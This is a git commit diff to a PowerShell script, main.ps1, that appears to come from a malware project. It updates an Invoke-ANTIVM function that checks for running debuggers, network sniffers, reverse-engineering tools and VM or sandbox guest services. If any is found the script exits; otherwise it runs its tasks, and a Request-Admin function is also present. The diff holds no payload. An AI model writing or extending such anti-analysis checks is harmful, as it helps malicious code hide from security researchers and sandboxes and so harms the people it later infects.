c384bba3d59314a27a924e7bc0e9df4396311ec5
CHA1NSK1 <96607632+Chainski@users.noreply.github.com>
2023-05-19 07:11:42 -0500

    Update main.ps1

--- main.ps1
+++ main.ps1
@@ -490,53 +490,56 @@ function Request-Admin {
 }
 
 function Invoke-ANTIVM {
-
- function antivm
- {
-   "autoruns"
-   "autorunsc"
-   "dumpcap"
-   "Fiddler"
-   "fakenet"
-   "HookExplorer"
-   "ImmunityDebugger"
-   "httpdebugger"
-   "ImportREC"
-   "LordPE"
-   "PETools"
-   "ProcessHacker"
-   "ResourceHacker"
-   "Scylla_x64"
-   "sandman"
-   "SysInspector"
-   "tcpview"
-   "die"
-   "dumpcap"
-   "filemon"
-   "idaq"
-   "idaq64"
-   "joeboxcontrol"
-   "joeboxserver"
-   "ollydbg"
-   "proc_analyzer"
-   "procexp"
-   "procmon"
-   "regmon"
-   "sniff_hit"
-   "sysAnalyzer"
-   "tcpview"
-   "windbg"
-   "Wireshark"
-   "x32dbg"
-   "x64dbg"
-   "Vmwareuser"
-   "Vmacthlp"
-   "vboxservice"
-   "vboxtray"
- }
+function antivm
+{
+   "autoruns",
+   "autorunsc",
+   "dumpcap",
+   "Fiddler",
+   "fakenet",
+   "hookexplorer",
+   "immunitydebugger",
+   "httpdebugger",
+   "importrec",
+   "lordpe",
+   "petools",
+   "processhacker",
+   "resourcehacker",
+   "scylla_x64",
+   "sandman",
+   "sysinspector",
+   "tcpview",
+   "die",
+   "dumpcap",
+   "filemon",
+   "idaq",
+   "idaq64",
+   "joeboxcontrol",
+   "joeboxserver",
+   "ollydbg",
+   "proc_analyzer",
+   "procexp",
+   "procmon",
+   "pestudio",
+   "qemu-ga",
+   "qga",
+   "regmon",
+   "sniff_hit",
+   "sysanalyzer",
+   "tcpview",
+   "windbg",
+   "wireshark",
+   "x32dbg",
+   "x64dbg",
+   "vmwareuser",
+   "vmacthlp",
+   "vboxservice",
+   "vboxtray",
+   "xenservice"
+}
 $processnames = antivm
 if(($processnames | ForEach-Object {Get-Process -Name $_ }) -eq $null){ 
-   Invoke-TASKS  
+   Invoke-TASKS 
 }
 else{ 
   exit
